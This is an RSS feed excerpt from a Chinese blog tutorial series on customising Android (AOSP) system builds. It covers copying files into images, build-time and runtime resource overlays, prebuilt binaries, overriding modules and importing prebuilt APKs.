<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on 青鸟的博客</title><link>https://blue-bird1.github.io/posts/</link><description>Recent content in Posts on 青鸟的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Wed, 31 Jan 2024 22:48:00 +0800</lastBuildDate><atom:link href="https://blue-bird1.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>从零开始自定义安卓系统(8) 用复制文件与叠加层自定义系统</title><link>https://blue-bird1.github.io/posts/aosp-8/</link><pubDate>Wed, 31 Jan 2024 22:48:00 +0800</pubDate><guid>https://blue-bird1.github.io/posts/aosp-8/</guid><description>从零开始自定义安卓系统(8) 用复制文件与叠加层自定义系统 复制文件 产品级拥有一个选项可以直接复制文件到系统 1 PRODUCT_COPY_FILES += test.sh:$(TARGET_COPY_OUT_VENDOR)/bin/test.sh \ 格式上很简单, 一个:分割的</description><content type="html"><![CDATA[<h2 id="从零开始自定义安卓系统8--用复制文件与叠加层自定义系统">从零开始自定义安卓系统(8)  用复制文件与叠加层自定义系统</h2>
<h3 id="复制文件">复制文件</h3>
<p>产品级拥有一个选项可以直接复制文件到系统</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nv">PRODUCT_COPY_FILES</span> <span class="o">+=</span> test.sh:<span class="k">$(</span>TARGET_COPY_OUT_VENDOR<span class="k">)</span>/bin/test.sh <span class="se">\
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>格式上很简单, 一个<code>:</code>分割的对应关系. 比较特殊的是使用<code>$(TARGET_COPY_OUT_VENDOR)</code>来获取指定目录.</p>
<p>这样有利于后续维护,这些常用的全局变量位于<code>build/core/envsetup.sh</code></p>
<p>里面定义了全局变量,  如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nv">TARGET_COPY_OUT_SYSTEM</span> <span class="o">:=</span> system
</span></span><span class="line"><span class="cl"><span class="nv">TARGET_COPY_OUT_SYSTEM_DLKM</span> <span class="o">:=</span> system_dlkm
</span></span><span class="line"><span class="cl"><span class="nv">TARGET_COPY_OUT_SYSTEM_OTHER</span> <span class="o">:=</span> system_other
</span></span><span class="line"><span class="cl"><span class="nv">TARGET_COPY_OUT_DATA</span> <span class="o">:=</span> data
</span></span><span class="line"><span class="cl"><span class="nv">TARGET_COPY_OUT_ASAN</span> <span class="o">:=</span> <span class="k">$(</span>TARGET_COPY_OUT_DATA<span class="k">)</span>/asan
</span></span><span class="line"><span class="cl"><span class="nv">TARGET_COPY_OUT_OEM</span> <span class="o">:=</span> oem
</span></span><span class="line"><span class="cl"><span class="nv">TARGET_COPY_OUT_ROOT</span> <span class="o">:=</span> root
</span></span><span class="line"><span class="cl"><span class="nv">TARGET_COPY_OUT_RECOVERY</span> <span class="o">:=</span> recovery
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 节选 全列表在此文件中搜索 `TARGET_OUT`即可
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>如果要复制到<code> /system/xxx</code> 可以使用<code>$(TARGET_COPY_OUT_SYSTEM)/xxx</code></p>
<p>一般用于放一些配置文件 例如<code>init.rc</code></p>
<h3 id="叠加层">叠加层</h3>
<p>叠加层也叫<code>overlay</code>层, 比起直接复制文件的区别在于. 复制文件是面向最终输出, 会复制到输出目录,  支持任意文件.</p>
<p>叠加层是面向编译系统, 可以实现在编译时替换资源文件. 但是也只能修改资源文件.</p>
<p>但是可以实现修改已有代码的配置,而无需修改安卓源代码.</p>
<p>要使用叠加层只需要</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PRODUCT_PACKAGE_OVERLAYS += ${LOCAL_PATH}/overlay 
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后根据要修改的文件路径新建对应的目录</p>
<p>例如要修改<code>frameworks/base/core/res/res/values/config.xml</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p overlay/frameworks/base/core/res/res/values
</span></span><span class="line"><span class="cl">touch overlay/frameworks/base/core/res/res/values/config.xml
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后按照<code>xml</code>格式 写上需要修改的内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;resouce&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="nt">&lt;bool</span> <span class="na">name=</span><span class="s">&#34;config_disableLockscreenByDefault&#34;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/bool&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/resouce&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>只会影响所写的值,不影响其他默认值.</p>
<p>要使用叠加层并不容易, 首先要知道到底有什么配置项,和在哪个路径.  而在了解这些之前几乎没什么用,  需要先阅读源码中的<code>framework/base/core/res/</code>里的<code>xml</code>文件中的注释.</p>
<h3 id="动态叠加层">动态叠加层</h3>
<p>也称为<code>运行时资源覆盖</code>(RRO),  其实就是从编译时覆盖变成了系统运行时覆盖,为了加入系统, 实际上安装形式是<code>apk</code></p>
<p>要想使用<code>RRO</code>,首先需要新建一个模块目录,然后添加<code>Android.bp</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">runtime_resource_overlay {
</span></span><span class="line"><span class="cl">    name: &#34;ExampleOverlay&#34;,
</span></span><span class="line"><span class="cl">    sdk_version: &#34;current&#34;,
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后添加<code>app</code>必要的<code>AndroidManifest.xml</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;manifest</span> <span class="na">xmlns:android=</span><span class="s">&#34;http://schemas.android.com/apk/res/android&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">package=</span><span class="s">&#34;com.example.overlay&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;application</span> <span class="na">android:hasCode=</span><span class="s">&#34;false&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;overlay</span> <span class="na">android:targetPackage=</span><span class="s">&#34;com.android.contacts&#34;</span>
</span></span><span class="line"><span class="cl">                   <span class="na">android:targetName=</span><span class="s">&#34;OverlayableResources&#34;</span>
</span></span><span class="line"><span class="cl">             	   <span class="na">android:resourcesMap=</span><span class="s">&#34;@xml/overlays&#34;</span>
</span></span><span class="line"><span class="cl">             <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/manifest&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>targetPackage</code> 是想要覆盖的apk名, 这里是<code>aosp</code>自带的联系人应用</p>
<p><code>@xml/overlays</code>是覆盖资源文件名 实际路径是<code>res/xml/overlays.xml</code></p>
<p>实际内容像这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;overlay</span> <span class="na">xmlns:android=</span><span class="s">&#34;http://schemas.android.com/apk/res/android&#34;</span> <span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="c">&lt;!-- Overlays string/config1 and string/config2 with the same resource. --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;item</span> <span class="na">target=</span><span class="s">&#34;string/config1&#34;</span> <span class="na">value=</span><span class="s">&#34;@string/overlay1&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;item</span> <span class="na">target=</span><span class="s">&#34;string/config2&#34;</span> <span class="na">value=</span><span class="s">&#34;@string/overlay1&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- Overlays string/config3 with the string &#34;yes&#34;. --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;item</span> <span class="na">target=</span><span class="s">&#34;string/config3&#34;</span> <span class="na">value=</span><span class="s">&#34;@android:string/yes&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- Overlays string/config4 with the string &#34;Hardcoded string&#34;. --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;item</span> <span class="na">target=</span><span class="s">&#34;string/config4&#34;</span> <span class="na">value=</span><span class="s">&#34;Hardcoded string&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- Overlays integer/config5 with the integer &#34;42&#34;. --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;item</span> <span class="na">target=</span><span class="s">&#34;integer/config5&#34;</span> <span class="na">value=</span><span class="s">&#34;42&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/overlay&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>value的格式与<code>apk</code> 定义资源格式没有区别, target是需要替换的资源id, 需要查看源码或反编译目标app读取资源文件.</p>
<p>安卓自带的联系人资源文件位于<code>packages/apps/Contacts/res/</code> 然后默认的英语在<code>values</code>, 如果要修改字符串在<code>strings.xml</code></p>
<p>如果想要修改开屏显示的<code>Add account , 搜索这个文件可以看到是</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">&#34;contacts_unavailable_add_account&#34;</span><span class="nt">&gt;</span>Add account<span class="nt">&lt;/string&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后在覆盖层文件添加一行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"> <span class="nt">&lt;item</span> <span class="na">target=</span><span class="s">&#34;string/contacts_unavailable_add_account&#34;</span> <span class="na">value=</span><span class="s">&#34;Add account by code&#34;</span> <span class="nt">/&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>添加到产品</p>
<p><code>PRODUCT_PACKAGES += rro</code></p>
<p>然后执行<code>mm</code>编译 后会出现在<code>system/product/overlay</code></p>
<h3 id="动态覆盖层管理">动态覆盖层管理</h3>
<p>更新完系统后可以用<code>adb shell cmd overlay</code> 查看动态叠加层状态</p>
<p><code> cmd overlay list</code>查看当前的<code>rro</code>  apk</p>
<p>可以看到这种输出</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">android
</span></span><span class="line"><span class="cl">[ ] com.android.internal.display.cutout.emulation.corner
</span></span><span class="line"><span class="cl">[ ] com.android.internal.display.cutout.emulation.double
</span></span><span class="line"><span class="cl">[ ] com.android.internal.systemui.navbar.gestural_wide_back
</span></span><span class="line"><span class="cl">[ ] com.android.internal.display.cutout.emulation.hole
</span></span><span class="line"><span class="cl">[ ] com.android.internal.display.cutout.emulation.tall
</span></span><span class="line"><span class="cl">[ ] com.android.internal.systemui.navbar.threebutton
</span></span><span class="line"><span class="cl">[ ] com.android.internal.systemui.navbar.gestural_extra_wide_back
</span></span><span class="line"><span class="cl">[ ] com.android.theme.font.notoserifsource
</span></span><span class="line"><span class="cl">[ ] com.android.internal.display.cutout.emulation.waterfall
</span></span><span class="line"><span class="cl">[ ] com.android.internal.systemui.navbar.gestural
</span></span><span class="line"><span class="cl">[ ] com.android.internal.systemui.navbar.gestural_narrow_back
</span></span><span class="line"><span class="cl">[x] com.android.systemui:neutral
</span></span><span class="line"><span class="cl">[x] com.android.systemui:accent
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">com.android.contacts
</span></span><span class="line"><span class="cl">[ ] com.example.overlay
</span></span></code></pre></td></tr></table>
</div>
</div><p>包出现在列表但是没有启用, 需要使用 <code>cmd overlay enable com.example.overlay  </code> 启用.</p>
<p>执行后可以看到
<img src="/images/image_2024-01-31_22-42-48.png" alt="contacts"></p>
]]></content></item><item><title>从零开始自定义安卓系统(7) 预装二进制文件和删除预装模块</title><link>https://blue-bird1.github.io/posts/aosp-7/</link><pubDate>Wed, 31 Jan 2024 19:07:48 +0800</pubDate><guid>https://blue-bird1.github.io/posts/aosp-7/</guid><description>从零开始自定义安卓系统(7) 预装二进制文件和删除预装模块 预编译二进制文件 操作上类似于预装系统app 不过变成了使用cc_prebuilt_bi</description><content type="html"><![CDATA[<h2 id="从零开始自定义安卓系统7--预装二进制文件和删除预装模块">从零开始自定义安卓系统(7)  预装二进制文件和删除预装模块</h2>
<h3 id="预编译二进制文件">预编译二进制文件</h3>
<p>操作上类似于预装系统<code>app</code> 不过变成了使用<code>cc_prebuilt_binary</code></p>
<p>推荐在<code>external/</code> 目录新建一个文件夹,然后添加一个<code>Android.bp</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">cc_prebuilt_binary</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="err">name:</span><span class="nt">&#34;ecapture&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="err">srcs:[</span><span class="nt">&#34;./ecapture&#34;</span><span class="err">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">strip</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">     <span class="err">none:true</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>比起系统<code>app</code>, 二进制文件的一大问题是 预编译的架构不一样是无法运行的, 这个时候可以使用<code>arch</code>参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cc_prebuilt_binary {
</span></span><span class="line"><span class="cl">   name:&#34;ecapture&#34;,
</span></span><span class="line"><span class="cl">   arch:{
</span></span><span class="line"><span class="cl">     x86_64: {
</span></span><span class="line"><span class="cl">       srcs:[&#34;./ecapture-v0.7.3-linux-x86_64/ecapture&#34;]
</span></span><span class="line"><span class="cl">     },
</span></span><span class="line"><span class="cl">     # 有四种架构 arm, x86,arm64, x86_64
</span></span><span class="line"><span class="cl">   },
</span></span><span class="line"><span class="cl">   strip:{none:true}
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>为每个不同的架构指定不同的二进制文件.</p>
<p>另一个问题就是未必想要放到<code>/system/bin</code>, 在<code>soong</code>大部分模块都具有以下两个属性</p>
<p><code>vendor</code> 和<code>product_specific</code>  , 设置为true后 会放到<code>/vendor</code> 和 <code>/product </code> 分区, 如果没有将会放入<code>/system/vendor</code> 和 <code>/system/product</code></p>
<h3 id="删除模块">删除模块</h3>
<h4 id="如何查看目标文件的对应代码路径">如何查看目标文件的对应代码路径</h4>
<p>很多情况下都是要删除一个系统<code>apk</code>,但是要删除一个文件,首先要知道他对应的源码路径.  在<code>out/target/product/&lt;产品名&gt;</code>  路径下有个<code>module-info.json</code></p>
<p>里面包含了模块与其对应的路径, 直接搜索对应的文件名, 会看到类似这样的<code>json</code>格式</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"> <span class="s2">&#34;ActivityManagerPerfTestsUtils&#34;</span><span class="err">:</span> <span class="p">{</span> <span class="nt">&#34;class&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;JAVA_LIBRARIES&#34;</span><span class="p">],</span>  <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;frameworks/base/tests/ActivityManagerPerfTests/utils&#34;</span><span class="p">],</span>  <span class="nt">&#34;tags&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;tests&#34;</span><span class="p">],</span>  <span class="nt">&#34;installed&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;out/target/product/test/testcases/ActivityManagerPerfTestsUtils/x86_64/ActivityManagerPerfTestsUtils.jar&#34;</span><span class="p">],</span>  <span class="nt">&#34;compatibility_suites&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;null-suite&#34;</span><span class="p">],</span>   <span class="nt">&#34;module_name&#34;</span><span class="p">:</span> <span class="s2">&#34;ActivityManagerPerfTestsUtils&#34;</span><span class="p">,</span>  <span class="nt">&#34;supported_variants&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;DEVICE&#34;</span><span class="p">]</span> <span class="p">}</span><span class="err">,</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>installled</code> 对应的就是路径, 而<code>module_name</code> 则是对应的名字, <code>path</code>对应源码路径. 之后再根据模块名</p>
<p>去删除.</p>
<h4 id="删除和替换模块">删除和替换模块</h4>
<p>如果要删除的话,需要修改对应产品的<code>Android.mk</code> 或者 系统app定义在<code>/build/make/core.mk</code> .移除对应的<code>PRODUCT_PACKAGES</code> 属性, 就是添加模块的反向操作.</p>
<p>另一种更可维护的方法就是使用替换.  <code>aosp</code> 实际上没有编译时删除模块的概念, 实际上使用的是<code>替换</code></p>
<p>因为版本问题, 以前博客都是使用<code>.mk</code>的形式, 例如 <a href="https://qiushao.net/2019/12/12/Android%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/6-%E5%88%A0%E9%99%A4%E5%8E%9F%E7%94%9F%E5%86%85%E7%BD%AEAPK/">秋少的博客</a>.</p>
<p>不过<code>soong</code>实际上也有类似的功能, 实际上也是填写了<code>LOCAL_OVERRIDES_PACKAGES</code>这个值</p>
<p>在部分模块下, 具有<code>overrides</code>属性, 可以通过这个属性后覆盖替换掉 其他模块.</p>
<p>例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">android_app_import {
</span></span><span class="line"><span class="cl">    # 省略
</span></span><span class="line"><span class="cl">    overrides: [&#34;Email&#34;,&#34;Music&#34;]
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>拥有这个属性的主要集中在<code>android</code> 模块, 在源码中主要用于替换<code>apk</code></p>
]]></content></item><item><title>从零开始自定义安卓系统(6) 自定义模块 添加系统app</title><link>https://blue-bird1.github.io/posts/aosp-6/</link><pubDate>Tue, 30 Jan 2024 18:26:01 +0800</pubDate><guid>https://blue-bird1.github.io/posts/aosp-6/</guid><description>从零开始自定义安卓系统(6) 自定义模块 添加系统app 前言 在之前就知道可以通过PRODUCT_PACKAGES 添加自己的包, 具体操作是 新建一个</description><content type="html"><![CDATA[<h2 id="从零开始自定义安卓系统6--自定义模块-添加系统app">从零开始自定义安卓系统(6)  自定义模块 添加系统app</h2>
<h3 id="前言">前言</h3>
<p>在之前就知道可以通过<code>PRODUCT_PACKAGES</code> 添加自己的包, 具体操作是 新建一个模块,然后</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nv">PRODUCT_PACKAGES</span> <span class="o">+=</span> 模块名
</span></span></code></pre></td></tr></table>
</div>
</div><p>要定义一个模块 可以使用<code>soong</code> 或者<code>makefile</code>,  在新版本系统推荐使用<code>soong</code></p>
<p><code>soong</code> 使用 <code>.bp</code>文件定义模块 <a href="https://source.android.com/docs/setup/build?hl=zh-cn">参考</a></p>
<p>从官方例子就可以看到其实格式和json一样简单,</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cc_binary {
</span></span><span class="line"><span class="cl">    name: &#34;gzip&#34;,
</span></span><span class="line"><span class="cl">    srcs: [&#34;src/test/minigzip.c&#34;],
</span></span><span class="line"><span class="cl">    shared_libs: [&#34;libz&#34;],
</span></span><span class="line"><span class="cl">    stl: &#34;none&#34;,
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>主要问题是找到需要的模块和属性 这个时候就需要<a href="https://ci.android.com/builds/submitted/11337780/linux/latest/view/soong_build.html">格式参考</a></p>
<p>里面主要根据语言分类, 想做一件事的时候查询对应类型,和对应模块名的格式参考</p>
<h3 id="添加预下载apk">添加预下载apk</h3>
<p>查看<code>android/soong/java</code>类型  看名字就知道 前面两个就是.</p>
<p><code>android_app</code>和<code>android_app_import</code></p>
<p>查阅文档克制区别在于 前者是需要编译的模块 后者是直接导入apk文件</p>
<p><a href="https://ci.android.com/builds/submitted/11337780/linux/latest/raw/java.html#android_app_import">文档</a>提供了一个例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">android_app_import {
</span></span><span class="line"><span class="cl">	    name: &#34;example_import&#34;,
</span></span><span class="line"><span class="cl">	    apk: &#34;prebuilts/example.apk&#34;,
</span></span><span class="line"><span class="cl">	    dpi_variants: {
</span></span><span class="line"><span class="cl">	        mdpi: {
</span></span><span class="line"><span class="cl">	            apk: &#34;prebuilts/example_mdpi.apk&#34;,
</span></span><span class="line"><span class="cl">	        },
</span></span><span class="line"><span class="cl">	        xhdpi: {
</span></span><span class="line"><span class="cl">	            apk: &#34;prebuilts/example_xhdpi.apk&#34;,
</span></span><span class="line"><span class="cl">	        },
</span></span><span class="line"><span class="cl">	    },
</span></span><span class="line"><span class="cl">	    presigned: true,
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>文档里还提供5行的其他选项, 不过基本都是通用选项, 与<code>app</code>有关的不多 , 看旁边注释就能了解作用</p>
<p>如果要导入一个叫<code>vnc.apk</code>的文件</p>
<p>新建一个目录,放入apk文件,和<code>Android.bp</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Android.bp
</span></span><span class="line"><span class="cl">android_app_import {
</span></span><span class="line"><span class="cl">    name: &#34;vnc_import&#34;,
</span></span><span class="line"><span class="cl">    apk: &#34;./vnc.apk&#34;,
</span></span><span class="line"><span class="cl">    # 解决可能的签名问题
</span></span><span class="line"><span class="cl">    dex_preopt: {
</span></span><span class="line"><span class="cl">       enabled: false,
</span></span><span class="line"><span class="cl">    },
</span></span><span class="line"><span class="cl">    presigned: true,
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后在<code>bluebird.mk</code> (产品mk文件)添加</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PRODUCT_PACKAGES += vnc_import
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后编译即可在 <code>system/app</code> 看到 <code>vnc_import</code>目录</p>
<p>如果遇到<code> mismatch in the &lt;uses-library&gt; tags between the build system and the manifest:</code></p>
<p>则按提示在 产品文件添加</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nv">PRODUCT_BROKEN_VERIFY_USES_LIBRARIES</span> <span class="o">:=</span> <span class="nb">true</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>或在bp文件添加提示中对应的lib</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
